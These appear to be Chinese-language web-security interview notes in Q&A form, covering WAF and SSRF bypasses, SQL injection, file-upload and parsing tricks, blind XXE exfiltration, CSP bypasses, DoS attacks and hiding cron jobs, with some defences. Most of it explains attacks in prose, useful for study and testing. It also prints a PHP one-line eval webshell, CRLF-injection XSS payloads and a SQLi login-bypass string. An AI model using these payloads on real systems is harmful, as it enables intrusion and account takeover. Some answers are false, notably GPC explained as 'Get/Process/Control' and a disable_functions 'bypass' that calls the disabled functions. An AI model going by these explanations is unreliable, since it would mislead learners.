### 假设某网站存在waf，不考虑正面绕过的前提下，应该如何绕过(分情况讨论 云waf/物理waf)
云 WAF 是在云服务提供商的基础设施上部署的，是由云服务提供商负责管理和维护的，用户无需担心基础设施的部署和维护。
云 WAF 可以应对大规模的网络流量和攻击。
物理 WAF 是部署在用户自己的网络环境中，由用户自己管理和维护，需要考虑硬件的购买、部署、配置和维护等方面的工作。物理 WAF 一般用于处理本地网络的流量。
绕过WAF：
混淆攻击载荷：对攻击载荷进行混淆或加密，使其在传输过程中难以被 WAF 检测到。可以使用加密算法、替换字符、添加噪音等技术来混淆攻击载荷。
分割攻击载荷：将攻击载荷分割成多个请求，绕过 WAF 的检测规则。通过将攻击载荷分散在多个请求中，可以降低被 WAF 检测到的概率。
避开特定的关键词：根据 WAF 的规则，避免在攻击载荷中使用被阻止的关键词。可以使用同义词替代或进行拼写变体来规避规则的检测。
使用非常见的 HTTP 方法：尝试使用不常见的 HTTP 方法，如 OPTIONS、PROPFIND、PUT 等，以绕过 WAF 对常见 HTTP 方法的检测。
非正面绕过：
利用 CDN 的设置问题：云 WAF 常与 CDN 集成，您可以尝试寻找 CDN 的配置问题，例如缓存设置、缓存绕过、路径规则等，以绕过 WAF 的检测。
利用特定服务的漏洞：云服务商可能存在一些未公开的漏洞或配置问题，您可以研究云服务商的特定产品和功能，寻找可能的绕过方法。
IP 转发和代理：尝试使用代理或 IP 转发服务，将流量转发到绕过云 WAF 的路径或服务器上。


### SSRF如何探测非HTTP协议
FTP 探测：可以尝试使用 SSRF 攻击向目标服务器的本地或其他服务器发送 FTP 请求，观察响应是否能够获取敏感信息或者验证 FTP 服务器的存在性。
DNS 探测：通过 SSRF 发送 DNS 请求，可以探测目标服务器的 DNS 解析功能、查找内部域名或子域名的存在性，以及获取与目标服务器相关的 DNS 记录。
SMTP 探测：利用 SSRF 发送 SMTP 请求，可以探测目标服务器的邮件服务是否开放，验证邮件服务器的存在性，或者执行邮件相关的操作，如发送电子邮件。
Redis 探测：通过 SSRF 发送 Redis 请求，可以探测目标服务器是否运行 Redis 服务，尝试执行 Redis 命令，获取敏感信息或进行其他操作。
SMB 探测：使用 SSRF 攻击尝试发送 SMB 请求，可以探测目标服务器是否运行 SMB 服务，验证 SMB 共享的存在性，并尝试获取共享文件或执行其他操作。


### 简述一下SSRF绕过首发
绕过域名白名单：目标服务器通常会设置域名白名单，限制可以访问的域名。
攻击者可以尝试使用 IP 地址、内部域名、IP 地址的十六进制表示或者绕过域名解析来绕过域名白名单。
绕过URL过滤：目标服务器可能会对请求的URL进行过滤，阻止访问敏感资源或特定协议。攻击者可以尝试使用编码、缩短URL、添加查询参数等方式绕过URL过滤。
绕过IP黑名单：目标服务器可能会设置IP黑名单，禁止访问特定IP地址。攻击者可以尝试使用代理、VPN或其他方式改变请求的源IP地址，绕过IP黑名单。
利用URL重定向：某些情况下，目标服务器可能会对请求中的URL进行重定向处理。攻击者可以构造带有重定向功能的URL，使目标服务器在重定向过程中发送内部请求。
利用特殊协议：除了HTTP协议，SSRF还可以利用其他协议，如FTP、SMTP、LDAP等。攻击者可以构造合适的请求，利用这些协议访问目标服务器的内部资源。


### SSRF中DNSReBind绕过原理以及修复方法
DNS Rebinding攻击是一种利用浏览器对DNS解析的特性进行攻击的技术。
因为同源策略浏览器看的是协议、域名、端口，这些都没有变，但域名对应的IP变了，从而达成跨域请求。
步骤如下：
1.浏览器访问恶意网站A，首先会进行DNS查询请求，获取网站A的IP地址
2.攻击者控制的DNS服务器返回网站A的真实IP地址，并设置TTL值为0，让浏览器不会长时间缓存它。
3.接着访问到恶意网站A，该网站反复发出恶意请求
4，因为之前TTL设置为0，缓存失效，继续发起DNS查询请求
5.攻击者控制的DNS服务器返回目标服务器的内网IP，因为满足同源策略，浏览器认为是安全的，于是请求发送到内网IP。

防御DNS Rebinding攻击的方法:
在服务器端进行输入验证和过滤，确保接收到的域名参数只能是合法的域名。



### 介绍SQL注入漏洞成因，如何防范，注入方式有哪些，除了拖取数据库数据，利用方法还有哪些？
字符串拼接
应用程序在发生错误时，将详细的错误信息返回给用户
应用程序使用的数据库用户具有过高的权限，例如具有对数据库表的写操作权限
应用程序没有对用户输入进行充分的验证和过滤

修复：
使用参数化查询或预编译语句
对用户输入进行严格的验证、过滤、转义
仅授予数据库用户执行所需操作的最低权限
不要返回详细的错误信息给用户，而是记录错误并提供一般性的错误消息

字符串注入：攻击者通过在字符串值中插入恶意的SQL代码来实现注入。例如，通过在输入字段中输入 ' OR 1=1 -- 来绕过登录验证条件。
数字注入：攻击者可以通过输入恶意的数字值来构造恶意的SQL语句。
布尔注入：应用程序可能会根据条件的真假执行不同的SQL查询。攻击者可以利用这一点来构造恶意的条件。
时间延迟注入：使用延迟函数或睡眠函数来观察应用程序的响应时间，从而推断出SQL查询的执行结果。

攻击者可以利用注入漏洞执行任意的SQL语句，这可能包括创建、修改或删除数据库对象，执行系统命令等。
攻击者可以利用注入漏洞绕过应用程序的业务逻辑，执行未经授权的操作，例如提交订单、进行交易等。
如果应用程序在数据库上使用特权账户（如管理员或超级用户），攻击者可以利用注入漏洞提升自己的权限。
如果有写功能可以写入恶意文件进行getshell。

### 如何通过sql注入写shell，写shell的前提条件是什么？
可以使用SELECT INTO OUTFILE语句将查询结果写入文件

1.存在SQL注入漏洞。
2.攻击者通常需要具备足够的权限，例如数据库管理员权限或对目标数据库的写入权限，以执行恶意的SQL语句。
3.知道文件上传路径，且允许执行文件。


### 讲述一下找回密码可能涉及的逻辑漏洞
1.重置密码的验证码在返回包中
2.验证码过于简单且无设置过期导致能爆破
3.验证码没有绑定用户，用自己手机号码接受验证码，然后提交时把自己手机号码改为其他人手机号码达到密码重置
4.这是我碰到最多的，重置密码先验证验证码，然后在进行密码重置，这里不是验证码+密码一起验证重置，先验证验证码可以抓返回包绕过跳到下一步密码重置。


### OAuth认证过程中可能会出现的漏洞：
OAuth认证比较常见的就是第三方登录。
可能出现的漏洞：
攻击者可以利用 CSRF 漏洞向用户的授权服务器发送伪造的请求，以获取访问令牌或授权码。
攻击者可以构造恶意的重定向 URL，将用户重定向到恶意站点并获取授权码或令牌。
如果令牌在传输或存储过程中不安全，攻击者可能截获或获取令牌，从而访问用户的资源。
攻击者可能通过获取已失效的令牌并续期来持续访问用户的资源。
导致攻击者能够绕过认证流程或获取非法的令牌。


### csp应该如何使用以及配置，有哪些绕过csp的方式
可以用一些CSP指令控制资源加载策略、限制表单提交的url等

CSP不影响location.href跳转，通过跳转绕过CSP获得资源。
同个站点B页面没有CSP保护，直接新建iframe标签用js操作A页面。
网站使用CDN，且存在低版本框架，用历史漏洞绕过。
JSONP绕过。
设置了default-src但没有额外设置base-uri,可用base-uri绕过。
svg绕过，svg能执行js脚本


### php中如何使用`phar://`伪协议出发反序列化，利用场景以及前提条件有哪些
phar://伪协议在 PHP 中用于访问和操作 PHAR（PHP 归档）文件。
使用 phar:// 伪协议加载恶意的 PHAR 文件，并触发反序列化。

文件上传漏洞利用：当目标应用程序存在文件上传功能时，攻击者可以构造恶意的 PHAR 文件，
并将其作为上传的文件，从而在应用程序解析和处理上传文件时触发反序列化漏洞。
任意文件读取利用：通过构造包含 phar:// 伪协议的文件路径，攻击者可以尝试读取应用程序内部的敏感文件，如配置文件、日志文件等。

目标代码存在反序列化漏洞
目标代码信任 phar 文件


### 如何绕过`php.ini`中`disable_function`的限制，有哪些方法
尝试通过执行外部命令的方式来实现相同的功能。例如，使用 exec()、shell_exec()、system() 等函数来执行系统命令。


### 文件上传中`%00`截断的原理是什么，官方是如何设计修复方案的？
%00 是 URL 编码中的空字节字符，也称为 NULL 字节。在某些编程语言和操作系统中，NULL 字节被视为字符串的结束符。
当一个字符串包含 NULL 字节时，该字符串在被处理时可能会被截断，只保留 NULL 字节之前的部分。
举个例子，攻击者可以上传一个名为 malicious.php%00.jpg 的文件，应用程序可能会将它保存为 malicious.php，并将其识别为 PHP 文件而不是 JPEG 文件。

输入验证和过滤：修复方案通常会强调对输入数据的验证和过滤，确保只接受符合预期格式和结构的数据。
安全的文件处理：修复方案会建议使用安全的文件处理函数和库，以确保文件的保存、读取和删除等操作都是安全的。
对文件名和路径进行显式长度检查，并确保在处理过程中将 NULL 字节视为非法字符。


### 实现一个一句话webshell，绕过rasp的方式有哪些
<?php @eval($_POST['cmd']); ?>

RASP是一种应用程序运行时自我保护技术，能保护应用程序免受各种攻击，如代码注入、SQL 注入、跨站脚本（XSS）等。
攻击者可能会使用代码混淆和加密技术来隐藏恶意代码，使其不容易被RASP检测和阻止。
攻击者可能使用高级的攻击技术，如内存注入、代码劫持、逆向工程等，绕过RASP的监控和防护机制。
针对RASP的规则和检测逻辑进行分析，并找到规避规则的方法，以免触发RASP的防护措施。

### 如何不通过数字以及字符构造webshell
用两个符号进行异或操作，结果成为数字或字母，然后进行拼接字符串


### 浏览器层面的防御
使用HttpOnly标志设置Cookie，防止通过JavaScript访问Cookie。
CSP是一种安全策略，通过定义允许加载的资源和限制可执行的代码，来减少XSS、数据泄露和代码注入等攻击。
设置X-Content-Type-Options标头为"nosniff"，防止浏览器执行恶意的MIME类型。
设置X-XSS-Protection标头启用内置的浏览器XSS过滤器。
设置X-Frame-Options标头来防止点击劫持攻击。该标头控制是否允许将网页嵌入到<frame>、<iframe>或<object>元素中。
通过设置Strict-Transport-Security标头，强制浏览器只使用安全的HTTPS协议与网站通信。


### 特殊情况的xss
当文件名被展示在网页中时，上传文件，文件名xss
input标签type为hidden，且过滤了闭合标签，使用accesskey触发, accesskey属性是使元素获得焦点
返回json格式的数据，但content-type定义成text/html，形成xss，
原理是浏览器根据Content-Type的定义来解析和处理响应数据，如果定义不正确，浏览器可能会将数据当作HTML进行解析，从而执行其中包含的恶意脚本。
x-forwarded-for造成存储性xss，页面展示ip
jsonp回调函数的函数名过滤不严，造成xss，因为jsonp是动态创建script标签，恶意函数名能与script标签进行闭合
url编码、html字符实体绕过过滤


### 为什么同源策略无法防御csrf？ 
同源策略不能阻止一个域向另一个域发送请求，它能阻止处理请求返回的数据，csrf在请求发送的瞬间就完成攻击了。


### 竞争条件漏洞
多个线程同时访问同一块数据时没有进行锁操作或同步操作。
- 案例1 文件上传到服务器后，先检查文件后缀名，如果不符合条件则删除。 
利用：在上传文件和文件检查的间隙，不断发起请求访问该文件；该文件一旦被执行，就在服务器上生成一个shell文件。
- 案例2：抽奖、提现 利用：使用burp intruder中的null payloads进行并发重复发包。
在攻击时，需要同样的请求反复被执行，在没有任何修改原始请求的场景下一般使用null payloads空类型。


### xxe无回显时，如何突破？
引用远程dtd，结合外带的方式，将读取到的内容保存成变量，然后将变量代入到url中传给攻击者的服务器，攻击者从服务器的日志中提取信息。

blind xxe小技巧：

- php环境中，使用php filter对数据进行base64编码，可绕过特殊字符(中文或<)的限制。
- java环境中，使用file协议读取数据，再通过ftp协议发送出去；ftp协议可以读到任意长度的文件，而且不受空格、换行符的影响。

### xxe拿shell？
思路：使用http get请求，攻击内网中的应用，例如Struts2、sql注入等。
- 读取一些敏感信息，例如tomcat-users.xml得到帐号密码，然后登录tomcat manager部署webshell
- 结合内网中的struts2漏洞，将poc传入url中，实现远程执行系统命令，或者部署bash文件反弹shell
- 如果php环境安装了expect扩展，可以直接执行系统命令


### 绕过ip地址的过滤
IP 地址转换：将本地 IP 地址进行进制转换，例如将 127.0.0.1 转换为十六进制 7F000001 或使用其他进制表示，
然后将转换后的 IP 地址作为请求的目标地址进行访问。这可以绕过简单的 IP 地址过滤机制，但对于复杂的过滤规则可能无效。

使用短链接服务：使用短链接服务将目标网站的 URL 缩短，然后通过缩短后的 URL 进行访问。
这样可以隐藏实际的 IP 地址或域名，使目标网站无法根据 IP 地址限制进行访问控制。
一个常见的短链接服务是 Bitly（bitly.com）。

使用 xip.io 或其他类似服务：xip.io 是一个特殊的 DNS 服务，它将任何 IP 地址映射到对应的域名。
例如，xxx.127.0.0.1.xip.io 将映射到 IP 地址 127.0.0.1。通过使用这样的服务，你可以通过域名访问目标网站而不是直接使用 IP 地址。

使用特殊字符或符号：有些应用程序对 IP 地址的输入进行过滤时可能没有考虑到特殊字符或符号。你可以尝试在 IP 地址中使用特殊字符（如 @）或符号来绕过过滤机制。
http://www.baidu.com@127.0.0.1 与 http://127.0.0.1 相同
www。baidu。com 与 www.baidu.com 相同

URL 跳转：有些网站可能会对来自本地 IP 地址的访问进行重定向或跳转。
你可以尝试构造特殊的 URL，例如在 URL 中添加查询参数或路径来绕过跳转规则。

利用 DNS 解析：如果目标网站通过域名进行访问控制，你可以尝试通过修改本地 hosts 文件或使用其他 DNS 解析技巧来绕过限制。
通过将目标域名解析到本地 IP 地址或其他可访问的 IP 地址，你可以绕过本地 IP 限制进行访问。

### 防御
- 设置URL白名单或限制内网IP
- 过滤返回信息，避免用户根据返回信息来判断服务器的状态
- 禁止url跳转
- 禁用不必要的协议，仅允许http https请求

### ssrf利用过程中如何获取内网ip？
- github搜索
- 历史漏洞
- 爆破192/172/10网段
- 对所有的子域名进行敏感信息扫描，有些源代码注释中可能泄露内网ip


### 文件上传绕过方法
前端绕过：burpsuite抓包修改绕过
黑名单绕过：比如限制了php，可以使用php5等这种类型绕过
文件后缀名绕过：大小写、空格、使用符号. ::$DATA 双写文件后缀名
apache解析漏洞：会跳过不认识的文件名。比如 xxx.php.jpg,找不到jpg文件，会将其剥离，知道找到php文件
%00截断绕过，比如xxx.php%00.jpg
条件竞争绕过：前提是先存储后校验。
文件内容绕过：比如图片马
Content-Type绕过：修改为允许上传的文件格式

防御
判断文件类型，使用白名单
文件上传的目录设置为不可执行
使用随机数改写文件名和文件路径
使用单独的文件服务器存储上传的文件


### 解析漏洞
- IIS6.0 目录解析：a.asp/a.jpg 文件解析：a.asp;.jpg
- IIS7.0/IIS7.5 实际是php cgi配置不当造成的解析漏洞 a.jpg/.php

- %00截断 影响版本：<= 0.8.37 a.jpg%00.php
- nginx解析漏洞 与Nginx版本无关，属于php cgi配置不当造成的解析漏洞 a.jpg/.php
- CVE-2013-4547 影响版本0.8.41 – 1.5.6 a.jpg(空格)\0.php

- 未知文件后缀解析漏洞 与Apache版本无关，属于配置不当造成的解析漏洞 a.php.jpg，从右向左解析
- 换行解析漏洞CVE-2017-15715 影响版本：2.4.0~2.4.29 a.php(换行)将会按php后缀进行解析

### url重定向
URL重定向是应用程序中存在一个可以重定向到任意URL的功能，从HTTP重定向到其他协议（如JavaScript协议）。

防止URL重定向漏洞：
使用白名单验证，限制允许重定向的URL范围。


### CRLF注入
攻击者通过在HTTP响应头中注入回车和换行符，可以插入自定义的响应头，包括设置Cookie、重定向、XSS等
一般漏洞出现在302跳转处


重定向的位置也可能出现crlf注入，CRLF是"回车+换行"（\r\n）的简称，HTTP Header与HTTP Body是用两个CRLF分隔的。 利用方法：

- 注入set cookie，造成会话固定漏洞 %0aSet-cookie:%20JSPSESSID%3Dwooyun
- 注入xss语句 %0d%0a%0d%0a<img src=1 onerror=alert(1)>
- 注入x-xss-protection绕过xss filter %0aX-XSS-Protection:%200%0d%0a%0d%0a<img src=1 onerror=alert(1)>

案例：nginx配置错误造成CRLF注入

## Redis未授权访问
无密码或弱密码
漏洞利用：
- 写ssh公钥，需要root权限
- 写定时任务，需要root权限
- 写webshell，需要知道web绝对路径

修复
- 设置redis密码
- 低权限用户运行redis
- 禁止外网访问redis
- 设置防火墙策略


## 点击劫持
原理：使用iframe把透明的恶意页面嵌套在正常的页面之上，并欺骗用户点击。
可以结合反射性xss与csrf一起利用。

防御：配置HTTP头X-Frame-Options，如果不设置，默认允许任意网站的iframe加载。



### https的通信过程
https只是保证了数据在传输过程中的机密性和完整性，无法防御对应用系统、服务的攻击。
- 客户端，请求https连接
- 服务端，返回证书，证书中包含公钥
- 客户端，使用根证书验证证书的合法性，并生成对称密钥，通过证书中的公钥加密，发送到服务端
- 服务端，使用私钥解密，获得对称密钥，使用对称密钥加密数据，ssl通信开始

### 测试ssl协议漏洞
SSL协议是一种用于保护网络通信安全的加密协议，用于在客户端和服务器之间建立安全连接。
以下是一些常见的SSL协议漏洞：
心脏出血漏洞是一个缓冲区溢出漏洞。攻击者可以通过发送恶意的心跳包请求，从服务器内存中读取敏感数据，包括私钥等。
CRIME漏洞是一种利用SSL/TLS压缩算法的漏洞，攻击者可以通过分析压缩数据包的大小来获取敏感信息，如会话Cookie。
BEAST攻击：是一种针对使用块密码算法（如CBC模式）的SSL/TLS加密通信的攻击。攻击者可以逐步解密加密报文，窃取敏感信息。
POODLE攻击：是一种利用SSLv3协议的漏洞，攻击者可以通过逐字节地猜测和修改加密数据，逐步恢复出明文信息。


### syn攻击
SYN 攻击是一种利用 TCP 协议中的三次握手过程中的漏洞来进行的拒绝服务攻击。
具体来说，SYN 攻击的步骤如下：
攻击者向目标服务器发送大量伪造的 TCP 连接请求，其中源 IP 地址通常是随机生成的或伪装成其他合法的 IP 地址。
目标服务器接收到这些伪造的连接请求，并为每个请求分配一个资源块来处理连接。
服务器发送 SYN+ACK 应答给攻击者，表示接受连接请求并准备建立连接。
攻击者不继续发送 ACK 确认报文段，而是丢弃或延迟发送，使得服务器一直处于等待状态。
服务器上的资源被耗尽，无法处理新的连接请求，导致正常用户无法建立连接或访问服务。
防御 SYN 攻击：
采用分布式架构、负载均衡和容灾机制等，分散和隔离攻击流量，保护核心服务器的稳定运行。
配置防火墙和负载均衡器，对连接请求进行过滤和分流，防止攻击流量直接达到目标服务器。
通过流量分析和监控工具，及时检测异常的连接请求，并采取相应的措施进行阻止和防御。
增加服务器的处理能力和内存，以承受更大规模的连接请求。
在操作系统或网络设备上启用 SYN Cookies 或 SYN Proxy 等机制来防御 SYN 攻击。

### Sockstress攻击
攻击者向目标服务器发送大量的伪造 TCP 数据报文段，其中包含伪造的源 IP 地址和随机生成的 TCP 序列号。
目标服务器接收到这些伪造的数据报文段，并尝试进行 TCP 连接的建立和数据的处理。
攻击者继续发送更多的伪造数据报文段，使目标服务器不断分配资源来处理这些请求。
目标服务器的处理能力和网络带宽被耗尽，无法正常处理合法的请求，导致服务不可用。
防御：
配置服务器和网络设备，限制并发连接数，防止过多的连接请求导致资源耗尽。
调整 TCP 参数，如超时时间、重传机制等，以减少对攻击的敏感性。


### TCP窗口大小欺骗攻击
- 在三次握手的最后一次ACK应答中，攻击者将其window size窗口大小设置为0
- 目标在传输数据时，发现接收端TCP窗口大小为0
- 停止传输数据，并发出TCP窗口探测包，询问攻击者其TCP端口是否有更新
- 攻击者没有更改TCP窗口的大小，目标就会一直维持TCP连接，等待数据发送 通过使目标主机长时间的维持TCP连接，来达到拒绝服务攻击的目的。


### dns放大攻击
攻击者首先扫描互联网上的开放DNS服务器，寻找容易受到欺骗的服务器。这些服务器通常具有开放的递归查询功能，允许任何主机发送DNS查询请求。
攻击者伪造源IP地址，源IP地址设置为目标IP地址，将大量的DNS查询请求发送到目标服务器，以请求大型的DNS响应。
DNS服务器接收到请求后，会向目标系统发送响应，从而产生大量的响应流量。
目标系统收到大量的DNS响应包，消耗带宽和处理能力，可能导致网络拥塞和服务不可用。
防御：
DNS服务器禁用开放的递归查询
限制DNS响应的大小，限制对特定查询类型的支持，限制查询频率等。
考虑使用专门的DNS防护服务


### 应用层的拒绝服务：
长连接攻击：攻击者通过发送大量的保持长时间连接的请求，占用目标服务器的资源，从而耗尽服务器的资源池，导致无法响应正常请求。
频繁的无效请求：攻击者发送大量的无效请求，如无效的URL、无效的参数或非法的数据格式，
使得服务器花费大量的时间和资源来处理这些无效请求，导致服务器负载过高或崩溃。
缓慢攻击：攻击者发送低速、低频率的请求，占用服务器资源的同时保持连接活动，使服务器资源逐渐耗尽，无法处理其他正常请求。
恶意数据提交：攻击者发送大量的恶意数据或非法数据到目标应用，如恶意代码、大型文件上传、非法字符等，使得应用程序无法正确处理或崩溃。


### 任意密码重置
- 验证码返回在数据包中
- 验证码可爆破
- 验证码未绑定用户
- 每一步没有相关联，可直接构造重置密码的url
- 修改response返回包的内容绕过验证，比如将false改为true或将0改成1
- session覆盖，使用A走重置密码的步骤，走到最后一步，先别输入新密码；打开新页面，
使用B走重置密码的步骤，走到接收验证码那一步；刷新A的页面，B的session覆盖了A的session，再输入新密码，成功重置了B的密码。
- 修复： 
(1)减少验证码有效时间
(2)验证码使用后即销毁 
(3)限制单个ip提交频率，防止暴力破解 
(4)对重要参数加入验证码同步信息或时间戳 
(5)接收验证码的帐号由服务端提供，不能信任客户端提交的数据


### 支付漏洞
- 修改金额：支付金额、退款金额
- 修改订单号
- 修改购买数量，改成负数
- 修改购买年限
- 重放支付成功的页面
- 构造支付成功的url，绕过支付直接充值成功
- 调用支付宝支付时，修改充值接口返回的数据，再发送给支付宝
- 修复： 
(1)敏感参数不要明文放在URL中 
(2)服务端效验客户端提交的参数 
(3)重要参数做数据签名，如金额和订单号等


### 越权漏洞
- 水平越权：相同级别用户之间的越权
- 垂直越权：不同级别用户之间的越权，如普通用户执行管理员用户的权限
- 经常出现越权漏洞的点： 
(1)修改个人资料 
(2)查询用户订单 
(3)重置密码 增删改查的位置均有可能存在越权漏洞。


### 未授权访问
- web相关：未认证的情况下能够访问到需要认证才能访问的页面。 (1)基于url地址实现的访问控制
- 服务相关： (1)redis未授权访问 (2)NFS未授权访问 (3)MongoDB未授权访问 (4)Hadoop未授权访问等...


### 验证码相关
- 验证码可爆破
- 验证码返回在数据包中
- 验证码容易被识别
- 服务器端验证码不失效，只会在刷新当前URL时才会刷新验证码
- 验证码空值绕过，删除验证码的参数仍可通过
- 验证码数量有限，多刷新几次，发现系统中的验证码只有固定的几个


### SQL的存储引擎
MyISAM：MyISAM是MySQL数据库最早的默认存储引擎。它以表为单位存储数据，支持高速读取操作，适用于读取密集型应用。
然而，MyISAM不支持事务和行级锁定，不适合高并发或写入密集型应用。
InnoDB：InnoDB是MySQL的另一个常见存储引擎，也是现在的默认存储引擎。
它支持事务、行级锁定、崩溃恢复和外键约束等特性，适用于高并发和写入密集型应用。InnoDB还支持自动增量列和全文索引等高级功能。


### GPC是什么？开启了怎么绕过
Get：获取用户输入数据。
Process：对获取的数据进行处理和过滤。
Control：将经过处理和过滤的数据用于后续的业务逻辑处理。

尝试绕过验证逻辑，通过伪造或篡改数据来绕过GPC处理。
尝试使用变形、大小写混合、特殊字符替代等方式绕过安全过滤。
发送超过限制的数据，或者利用分段请求的方式绕过长度检查。
使用URL编码、HTML实体编码、JavaScript转义符、Unicode编码等绕过。


### Mysql一个@和两个@什么区别
单个@符号是用于用户变量，由用户在会话中自定义的变量，可以存储和检索值。
两个@符号是由MySQL服务器定义和使用的变量，用于控制服务器的行为和配置。


### wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化
三层交换机变化：三层交换机通常根据数据报的目标IP地址来进行转发决策。在转发过程中，三层交换机不会修改数据报的源IP地址和目标IP地址。
它们会根据自己的转发表将数据报转发到相应的出接口。

路由器变化：路由器是在网络层操作的设备，它会根据路由表中的规则将数据报从一个网络转发到另一个网络。在路由器经过数据报时，可能会进行以下修改：
TTL (Time to Live)：路由器会减少数据报的TTL值，以指示数据报已经通过一个路由器。TTL的减少是为了防止数据报在网络中无限循环。
校验和：某些路由器会重新计算数据报的校验和，以确保数据的完整性。
IP片段：如果数据报太大，路由器可能会将其分成更小的片段进行传输。这些片段会在目标主机上重新组装成完整的数据报。

NAT协议主要用于将私有IP地址与公共IP地址之间进行转换。
外部设备发起通信请求时，将数据报发送到目标设备的公共IP地址。
NAT设备接收到数据报后，查其目标IP地址和端口号，并将其转换为内部设备的私有IP地址和端口号，并将数据报发送到内部设备。
内部设备接收数据报，并进行相应的处理。
当内部设备发送响应时，NAT设备将其源IP地址和端口号转换为公共IP地址和端口号，并将响应发送回外部设备。


### linux计划任务，黑客隐藏自己的计划任务会怎么做。
修改计划任务的名称，使其看起来像是系统或其他合法的任务
将文件属性设置为隐藏
对计划任务的命令进行加密或压缩


### 挖过最难的漏洞是什么
网络协议漏洞


#### 多线程 异步 协程 多路复用 用哪一个最快 为什么
多线程：是指在一个程序中同时执行多个线程，每个线程可以独立执行不同的任务。
异步：是基于回调机制，通过将任务提交给异步处理器，在任务完成后回调处理结果。
协程：是一种轻量级的线程，可以在不同的任务之间切换，但不需要像线程切换那样的操作系统开销。
多路复用：多路复用是一种IO模型，允许单个线程处理多个IO事件。它通过使用非阻塞IO和事件驱动的方式，将多个IO操作复用在一个线程中，提高了系统的并发性能。

如果应用场景需要处理密集的计算任务，多线程可能是最快的选择，因为多个线程可以同时执行计算任务，充分利用多核处理器的能力。
如果应用场景是IO密集型操作，异步和协程可能更合适。异步和协程可以避免线程切换开销，并且可以处理大量并发的IO操作。
如果应用场景需要高并发的网络连接处理，多路复用可能是最快的选择，因为它可以在一个线程中同时处理多个网络连接，减少了线程切换和管理的开销。


### Content-Type
Content-Type 是通过 HTTP 头部字段来指定客户端请求的内容类型。以告知服务器请求中所携带数据的格式和类型。
一些常见的 Content-Type 类型包括：
multipart/form-data：用于表示包含文件上传的表单数据。
application/x-www-form-urlencoded：用于表示 URL 编码的表单数据。
application/json：用于表示请求中的数据是 JSON 格式。
application/xml：用于表示请求中的数据是 XML 格式。
image/png：用于表示 PNG 图像的内容类型。


### web常用的加密算法有什么
非对称加密 RSA 用于生成公钥和私钥对，实现加密和解密操作。
对称加密 AES 对称加密算法，用于加密和解密数据。
散列算法 MD5 SHA 
base64

### 有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？
内网渗透一般就是进行横向移动和提升权限，不过这方面的经验我是偏弱的，
因为在没有授权的情况下进行后渗透容易吃国家饭，所以这块内容在当时刚学习的时候在虚拟机玩了下，就没碰过了，没啥实战经验。


### mysql中like查询会会非常缓慢，如何进行优化
使用like模糊查询是不能使用索引的，所以导致查询缓慢。
优化：
尽量不适用模糊查询
实在想用模糊查询的可以使用Elasticsearch数据库，他是通过分词来查询的，相当于模糊查询


### 渗透的时候如何隐藏自己的身份
使用代理服务器：通过使用代理服务器，可以隐藏真实的IP地址和位置信息。
使用匿名化网络工具：例如，使用Tor网络可以通过多层加密和随机路由来隐藏您的身份。谷歌的一个插件，隐私獾，防止被跟踪。
使用VPN：连接到VPN服务器可以隐藏您的真实IP地址，并将您的数据流量通过加密隧道进行传输。
使用匿名化浏览器：特殊设计的浏览器，如Tor浏览器或I2P浏览器，可以提供匿名浏览体验。
使用伪装身份：在渗透测试中，您可以使用虚假的身份信息，包括用户名、电子邮件地址、IP地址等。


### 主机疑似遭到入侵，要看哪里的日志
在Linux系统中，/var/log/下存放了很多日志，比如系统日志、身份验证日志、Web服务器日志、数据库日志、安全日志、应用程序日志。
这些日志具体的路径我忘了，但也不需要记住，真要是需要上网搜一下就知道了


### 只给你一个网址，如何进行渗透测试
第一步就是信息收集：
首先收集网站的注册信息，包括邮箱、用户名、电话等，可以利用这些反查IP或者可以利用这些生成密码进行账号密码爆破。
接着进行子域名枚举，获取该网站的所有子域名。
接着使用Nmap端口扫描工具查看这些域名开放的端口和服务，比如一些端口运行着网站，
一些端口运行着MySQL、Redis、FTP等服务可以看看存不存在弱口令和一些已知漏洞，扩大攻击面。
接着找信息泄露，比如.git文件泄露、一些存着敏感信息的文件、网站源码压缩包等，也可以借助google hack去找，或者去github上去搜搜，可能有意想不到的收获
第二步就是找漏洞：
可以使用漏洞扫描器或者手工找。
首先看网站使用的了哪些组件，这些组件有没有历史漏洞，接着就是耐心的找了，
比如：XSS、CSRF、SSRF、注入、代码执行、命令执行、越权访问、目录读取、任意文件读取、文件包含、远程命令执行、弱口令、上传漏洞等
如果实在找不到漏洞可以考虑社工：比如进行钓鱼等
第三步就漏洞利用，也就是后渗透了：
比如getshell后就进行横向移动和提权。


### SQL注入，id=1如何检测？order by怎么利用？limit语句怎么利用？盲注有什么？
order by利用
如果order by后面是可控的，则有可能存在sql注入
在已知存在sql注入时，order by能确定该表有几个字段，然后配合union select进行回显

limit利用
如果limit 后面可控，可以跟procedure analyse()函数进行报错注入


### sleep被禁用后还能怎么进行sql注入
当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。


### XSS可以控制属性怎么利用
通过注入恶意JavaScript代码到事件属性中，例如onload、onclick等，来执行任意的JavaScript代码。
通过注入恶意的CSS样式属性，如style属性，来改变页面的显示效果或隐藏恶意内容。
XSS还可以通过控制其他HTML标签的属性来实现攻击，如src、href等。这些属性可以用来加载恶意的脚本、跳转到恶意网站等。


### 请求头中哪些是有危害的？
其实每个请求头都会存在危害，但我现实中碰到最多的是这三个：
Cookie：Cookie字段包含了用户的身份验证令牌和其他会话信息。如果Cookie被泄露或被篡改，攻击者可以冒充用户身份、执行会话劫持等攻击。
X-Forwarded-For：用于指示请求经过的代理服务器的IP地址。攻击者可以伪造X-Forwarded-For字段来绕过IP地址限制、执行IP欺骗或隐藏真实的来源IP地址。
Content-Type：Content-Type字段指定了请求正文的媒体类型。可以通过伪造Content-Type字段来绕过服务器的输入验证或执行恶意的文件上传攻击。


### XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过
xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。
如果一定要使用，至少要禁用DTD、Entity。 
xxe危害 
读取本地文件，
执行系统命令，
探测内网端口，
攻击内网服务 


### JAVA中间件的漏洞，举几个例子？
Tomcat：远程代码执行、目录遍历、信息泄露
JBoss：远程代码执行、身份验证绕过、信息泄露
WebLogic：远程代码执行、XXE、安全配置问题
RabbitMQ：未经身份验证的访问、拒绝服务、信息泄露
Nginx：缓冲区溢出、配置错误导致的信息泄露、认证绕过
Redis：未经身份验证的远程命令执行、未授权访问、拒绝服务
